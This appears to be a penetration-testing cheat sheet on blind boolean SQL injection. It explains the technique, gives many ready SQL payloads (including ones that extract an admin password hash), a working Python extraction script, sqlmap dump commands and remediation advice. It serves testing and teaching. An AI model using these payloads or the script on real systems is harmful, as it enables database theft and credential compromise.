# SQL Injection Blind Boolean

## Overview
Blind Boolean SQL injection is used when the application is vulnerable to SQL injection but does not display database errors or query output in the HTTP response. Instead, the application behaves differently (different content, redirect, or status code) depending on whether an injected SQL condition is true or false. By crafting queries that ask yes/no questions about the database, an attacker can extract every character of any data — one bit at a time — even though nothing is directly visible in the response.

## How It Works
- The application uses a vulnerable query but suppresses all errors and does not echo query results.
- The attacker injects a TRUE condition (`1 AND 1=1`) — the page loads normally.
- The attacker injects a FALSE condition (`1 AND 1=2`) — the page is empty, returns an error page, or differs somehow.
- This confirms SQL injection vulnerability and provides an oracle (TRUE/FALSE response).
- The attacker then asks binary questions: `AND (SELECT SUBSTRING(version(),1,1))='5'` — if true, the first character of the version is '5'.
- By repeating this for each character position and each possible character value, all data is extracted bit by bit.
- Tools like sqlmap automate this process with binary search to minimize requests.

## Impact
- Same as classic SQL injection: full database read, authentication bypass, potential RCE.
- Slower extraction than error-based, but equally complete.
- Completely invisible in application UI — only requires observing a binary difference in behavior.
- Data exfiltration possible even from applications with complete error suppression.

## Where to Look
- Same as classic SQLi: URL parameters, POST bodies, cookies, headers.
- Specifically: search endpoints that return "0 results" vs. "results found" — boolean oracle.
- Login forms that return "invalid credentials" vs. "account found but password wrong" — different messages = oracle.
- Redirects: `302 Found` vs. `200 OK` based on a condition.
- HTTP status codes: `200` vs. `404/500` based on query result.
- Response length differences: same page but content differs based on condition.
- Any parameter where TRUE/FALSE inputs produce consistently different responses.

## Testing Steps
1. Identify a parameter and inject `' AND '1'='1` and `' AND '1'='2` — observe whether responses differ.
2. Alternatively try: `1 AND 1=1--` vs `1 AND 1=2--` for numeric parameters.
3. Confirm a reliable boolean oracle: the two responses must be consistently distinguishable (different content, length, status, or redirect).
4. Determine the database type: `AND SUBSTRING(version(),1,1)='5'` (MySQL), `AND SUBSTRING(@@version,1,1)='M'` (MSSQL).
5. Extract the database name: `AND SUBSTRING(database(),1,1)='a'` — iterate characters until TRUE.
6. Enumerate tables: `AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'`
7. Enumerate columns and extract data one character at a time.
8. Use binary search to minimize requests: instead of trying 'a', 'b', ..., 'z', use `ASCII(SUBSTRING(...))>64` to halve the character space each time.
9. Automate with sqlmap: `sqlmap -u "https://target.com/page?id=1" --technique=B --dbs`
10. Document the oracle condition, request/response evidence, and extracted data sample.

## Payloads / Techniques

```sql
-- Boolean oracle detection
-- TRUE condition (page loads normally):
1 AND 1=1--
' AND '1'='1'--
1' AND '1'='1'--

-- FALSE condition (page differs):
1 AND 1=2--
' AND '1'='2'--
1' AND '1'='2'--

-- Confirm database type
' AND SUBSTRING(version(),1,1)='5'--           -- MySQL 5.x
' AND SUBSTRING(version(),1,1)='8'--           -- MySQL 8.x
' AND SUBSTRING(@@version,1,3)='Mic'--         -- MSSQL
' AND SUBSTRING(version(),1,10) LIKE 'PostgreSQL%'--  -- PostgreSQL

-- Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),2,1)='p'--
' AND SUBSTRING(database(),3,1)='p'--
-- ... continue until full name extracted

-- Binary search with ASCII
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is first char ASCII > 64?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- > 96?
' AND ASCII(SUBSTRING(database(),1,1))>108--   -- > 108?
' AND ASCII(SUBSTRING(database(),1,1))=109--   -- = 109 ('m')?

-- Extract table names
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),2,1)='s'--

-- Extract specific data (e.g., admin password hash)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='2'--

-- Length extraction (to know when to stop)
' AND (SELECT LENGTH(database()))=5--
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=60--

-- Conditional redirect (MySQL)
' AND IF(1=1,SLEEP(0),SLEEP(5))--   -- Boolean confirmed: no sleep
' AND IF(1=2,SLEEP(0),SLEEP(5))--   -- Boolean confirmed: sleep occurs

-- PostgreSQL boolean
' AND (SELECT SUBSTRING(version(),1,1))='P'--
' AND (SELECT COUNT(*) FROM pg_tables WHERE tablename='users')=1--
```

```python
import requests

BASE = "https://target.com"
PARAM = "id"
TRUE_INDICATOR = "Welcome"  # String present in TRUE response

def boolean_oracle(payload):
    """Returns True if payload results in TRUE condition."""
    r = requests.get(f"{BASE}/item", params={PARAM: payload})
    return TRUE_INDICATOR in r.text

def extract_string(query, max_len=50):
    """Extract a string from the database using boolean oracle."""
    result = ""
    for pos in range(1, max_len + 1):
        # Binary search for each character
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            payload = f"1 AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}--"
            if boolean_oracle(payload):
                lo = mid + 1
            else:
                hi = mid
        
        if lo == 32:  # Space or non-printable = end of string
            break
        result += chr(lo)
        print(f"[+] Position {pos}: {chr(lo)} -> '{result}'")
    
    return result

# Confirm injection
print("[*] Testing boolean oracle...")
if boolean_oracle("1 AND 1=1--") and not boolean_oracle("1 AND 1=2--"):
    print("[+] Boolean SQL injection confirmed!")
    
    # Extract database name
    db_name = extract_string("SELECT database()")
    print(f"[+] Database: {db_name}")
    
    # Extract first table name
    table = extract_string(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT 0,1")
    print(f"[+] First table: {table}")
```

```bash
# sqlmap automated boolean-only extraction
sqlmap -u "https://target.com/item?id=1" \
  --technique=B \
  --dbs \
  --batch \
  --level=3

# Enumerate tables in a specific database
sqlmap -u "https://target.com/item?id=1" \
  --technique=B \
  -D target_db \
  --tables \
  --batch

# Dump a specific table
sqlmap -u "https://target.com/item?id=1" \
  --technique=B \
  -D target_db \
  -T users \
  --dump \
  --batch

# Boolean injection in POST body
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  --technique=B \
  -p username \
  --dbs \
  --batch

# Boolean injection in cookie
sqlmap -u "https://target.com/dashboard" \
  --cookie="session=abc123; user_id=1" \
  --technique=B \
  -p user_id \
  --dbs
```

## Burp Suite Tips
- **Intruder — Cluster Bomb**: Inject character-by-character payloads using Intruder in Cluster Bomb mode — one payload set iterates position (1,2,3...), another iterates character value (a-z, 0-9). Mark the response length or a keyword as the grep match condition to identify TRUE responses.
- **Comparer on Response Bodies**: Send the TRUE and FALSE responses to Burp Comparer to identify exactly what changes between them — this ensures you pick a reliable oracle indicator.
- **Active Scanner**: Burp's scanner will detect boolean-based SQLi automatically and report it as a finding.
- **Extensions — SQLiPy**: Integrates sqlmap into Burp — right-click any request and launch sqlmap directly from Burp.
- **Turbo Intruder**: For high-speed boolean character extraction, Turbo Intruder can send thousands of requests per second, making manual boolean SQLi extraction feasible in minutes.

## Tools
- **sqlmap** — primary automated tool: `sqlmap -u "URL" --technique=B`
- **Burp Suite** — manual detection and exploitation via Intruder and Repeater.
- **BBQSQL** — Python-based blind SQLi framework with customizable oracles.
- **bsqlbf** — Blind SQL Brute Forcer, specialized for boolean-based extraction.
- **Havij** — GUI tool that supports blind boolean mode.

## Remediation
- Use parameterized queries / prepared statements — the only reliable defense.
- ORMs with parameterized bindings (SQLAlchemy, Hibernate, ActiveRecord).
- Input validation: strict whitelist of expected data types and formats.
- Suppress and log all database errors server-side — never expose them to the client.
- Apply least privilege to database accounts.
- WAF rules for common boolean SQLi patterns as a supplementary layer.

## References
https://portswigger.net/web-security/sql-injection/blind
https://owasp.org/www-community/attacks/Blind_SQL_Injection
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
https://github.com/sqlmapproject/sqlmap
https://cwe.mitre.org/data/definitions/89.html
